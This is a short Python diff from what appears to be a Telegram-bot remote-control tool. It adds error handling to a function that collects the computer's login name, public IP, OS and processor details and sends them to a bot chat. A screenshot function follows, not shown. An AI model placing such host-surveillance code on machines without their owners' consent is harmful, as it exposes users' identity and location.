@@ -4,18 +4,23 @@ import mss.tools
 
 
 def pc_info(message, user_id, bot):
-    username = os.getlogin()
-    r = requests.get('https://ip.42.pl/raw')
-    user_ip = r.text
-    system_name = platform.platform()
-    processor = platform.processor()
-    os_version = platform.version()
-    bot.send_message(user_id,
-                     "Name: " + username
-                     + "\nIP: " + user_ip
-                     + "\nOS: " + system_name
-                     + "\nProcessor: " + processor
-                     + "\nOS version: " + os_version)
+    try:
+        username = os.getlogin()
+        try:
+            user_ip = requests.get('https://api.ipify.org?format=raw', timeout=20).text
+        except requests.exceptions.RequestException:
+            user_ip = "unknown"
+        system_name = platform.platform()
+        processor = platform.processor()
+        os_version = platform.version()
+        bot.send_message(user_id,
+                         "Name: " + username
+                         + "\nIP: " + user_ip
+                         + "\nOS: " + system_name
+                         + "\nProcessor: " + processor
+                         + "\nOS version: " + os_version)
+    except:
+        bot.send_message(user_id, "An error occurred while trying to get information about the computer")
 
 
 def get_screenshot(message, user_id, bot):
